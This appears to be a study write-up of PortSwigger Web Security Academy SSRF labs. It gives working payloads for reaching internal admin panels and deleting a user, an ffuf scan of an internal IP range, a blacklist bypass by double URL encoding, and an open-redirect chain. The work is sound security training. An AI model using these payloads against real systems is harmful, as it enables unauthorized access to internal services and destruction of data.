# Server-side request forgery (SSRF)

- https://portswigger.net/web-security/ssrf
- https://portswigger.net/web-security/ssrf/blind

## Basic SSRF against the local server

Checking the items in the stock functionality is made by `POST /product/stock` request, which takes `stockApi` as param.

Its initial value of this param is `http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1`, but this site is not available, so we can assume this is a link to the internal server and the app makes request to that endpoint retrieving its value to the website.

Changing the `stockApi` param to `http://localhost/admin` retrieves the content of the admin panel embeded in the product page.

Performing `POST /product/stock` request with `stockApi` value set as `http://localhost/admin/delete?username=carlos` removes the `carlos` user and solves the lab.

## Basic SSRF against another back-end system

This time stock check functionality is at `192.168.0.1`, which we can observe at `POST /product/stock` within `stockApi` parameter. 

`/admin` functionality is not present at this IP, but we can try to find different IP which may have it. To scan the network below code was used. Additionally it forwards the requests via Burp proxy and filters 500 responses.

```
seq 0 255 > ip.txt
ffuf -u 'https://0a98008d032d9726815dcf3f001c0047.web-security-academy.net/product/stock' -X POST -w ip.txt -d 'stockApi=http://192.168.0.FUZZ:8080/admin' -fc 500 -x http://localhost:8080
```

After this, one IP is revieled and we can access the admin pannel and remove the user with `stockApi` param set sa `http://192.168.0.26:8080/admin/delete?username=carlos`.

## SSRF with blacklist-based input filter

Using `stockApi` param as previously we can try to perform SSRF attack again, but this time it will be blocked.

Iterative tries to bypass the block displayed as a list below:
 - http://127.0.0.1/ - blocked
 - http://127.1/ - not blocked, 200 response cotaining embeded home page
 - http://127.1/admin - blocked
 - http://127.1/administrator - blocked
 - http://127.1/admin/1 - blocked
 - http://127.1/1 - not blocked
 - http://127.1/aDmIn - not blocked, but no results either
 - http://127.1/admi - not blocked, "admin" substring must be detected and blocked
 - http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65 (admin 2x times URL encoded) - not blocked and results in admin panel!

Now that we have found a way to access the admin panel, we can remove the `carlos` user and solve the lab, using `stockApi` param with value `http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos`

## SSRF with filter bypass via open redirection vulnerability

`GET /product/nextProduct` is vulnerable to open redirect. `path` param originaly is set as a relative path, but it accepts also full url and redirects to it without any issues.

Providing `http://localhost:8080/admin` as `path` param responds with 302 status and redirects to `localhost` happily.

This time `POST /product/stock` as `stockApi` param accepts only relative paths. Providing full URL responds with an error.

We can make use of open redirect in relative path `/product/nextProduct` to make a redirect to a full URL.

Making a `POST /product/stock` with param `stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//localhost/` responds with a homepage with visible navigation to `/admin` page, so we must bypass classic authentication or has a admin session somehow in the app.

Adding `/admin` to previous endpoint fails, so according to lab description we should fetch `http://192.168.0.12:8080/admin`

Making a `POST /product/stock` with param `stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin` accesses the admin panel and `stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos` removes `carlos` user which solves the lab.

## Blind SSRF with out-of-band detection

Cannot be done because it requires Burp Collaborator - Pro only feature.

Bur apparently it is enough to replace `Referer` header to our server FQDN, which will trigger `SSRF`, by server visiting provided URL.
